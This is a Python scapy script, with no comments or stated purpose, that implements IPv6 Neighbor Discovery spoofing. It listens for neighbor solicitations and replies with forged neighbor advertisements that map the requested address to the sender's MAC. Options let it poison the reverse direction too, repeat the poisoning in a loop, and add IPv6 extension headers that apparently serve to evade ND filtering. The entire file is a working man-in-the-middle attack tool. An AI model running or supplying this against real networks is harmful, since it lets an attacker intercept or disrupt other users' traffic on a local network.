import argparse
import os
import time
import functools
import operator
import random
import scapy.all as sp
import scapy.layers.inet6 as inet6

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--iface')
parser.add_argument('-M', '--mac')
parser.add_argument('-H', '--do-hbh', action='store_true')
parser.add_argument('-F', '--do-frag', action='store_true')
parser.add_argument('-D', '--do-dst', action='store_true')
parser.add_argument('-r', '--do-reverse', action='store_true')
parser.add_argument('-l', '--do-loop', action='store_true')
args = parser.parse_args()
iface = args.iface
mac = args.mac
do_hbh = args.do_hbh
do_frag = args.do_frag
do_dst = args.do_dst
do_reverse = args.do_reverse
do_loop = args.do_loop

if iface:
    sp.conf.iface = iface

mac = mac or sp.conf.iface.mac

ipexthdrs = []
if do_hbh:
    ipexthdrs.append(inet6.IPv6ExtHdrHopByHop())
if do_frag:
    ipexthdrs.append(inet6.IPv6ExtHdrFragment(id=random.getrandbits(32)))
if do_dst:
    ipexthdrs.append(inet6.IPv6ExtHdrDestOpt())
if ipexthdrs:
    ipexthdrs = functools.reduce(operator.truediv, ipexthdrs)
else:
    ipexthdrs = None


def prn(pkt):
    ippkt = pkt[inet6.IPv6]
    nspkt = ippkt[inet6.ICMPv6ND_NS]
    print(f'Spoofing to solicit {nspkt.tgt} from {ippkt.src}')

    p = sp.Ether(src=mac, dst=pkt.src) / \
        inet6.IPv6(src=nspkt.tgt, dst=ippkt.src)
    if ipexthdrs:
        p /= ipexthdrs
    p /= inet6.ICMPv6ND_NA(R=1, S=1, O=1, tgt=nspkt.tgt) / \
        inet6.ICMPv6NDOptDstLLAddr(lladdr=mac)
    sp.sendp(p, verbose=0)

    pr = None
    if do_reverse:
        pr = sp.Ether(src=mac, dst=pkt.dst) / \
            inet6.IPv6(src=ippkt.src, dst=nspkt.tgt)
        if ipexthdrs:
            pr /= ipexthdrs
        pr /= inet6.ICMPv6ND_NA(R=1, S=0, O=1, tgt=ippkt.src) / \
            inet6.ICMPv6NDOptDstLLAddr(lladdr=mac)
        sp.sendp(pr, verbose=0)

    if os.fork() == 0:
        time.sleep(0.0002)
        sp.sendp(p, verbose=0)
        if do_reverse:
            sp.sendp(pr, verbose=0)
        if do_loop:
            while True:
                time.sleep(5)
                sp.sendp(p, verbose=0)
                if do_reverse:
                    sp.sendp(pr, verbose=0)


filterstr = 'icmp6[icmp6type]==icmp6-neighborsolicit and not src ::'

sp.sniff(filter=filterstr, prn=prn, quiet=True)
